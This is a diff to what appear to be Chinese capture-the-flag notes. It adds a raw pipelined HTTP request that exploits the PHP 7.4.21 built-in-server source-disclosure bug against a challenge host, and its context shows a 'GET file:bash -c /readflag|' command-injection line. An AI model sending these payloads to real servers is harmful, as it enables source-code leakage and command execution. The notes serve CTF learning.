@@ -67,3 +67,14 @@ GET file:bash -c /readflag|
 ^
 ## **nuclei扫描**
 有时候可能会出现一些cve漏洞作为前提，这时候可以漏扫一下先。
+
+
+如：PHP<=7.4.21时通过`php -S`开起的WEB[服务器]存在源码泄露漏洞。 
+payload：
+```
+GET /flag.php HTTP/1.1
+Host: challenge.wucup.cn:38308
+
+
+GET /Kawakaze HTTP/1.1
+```
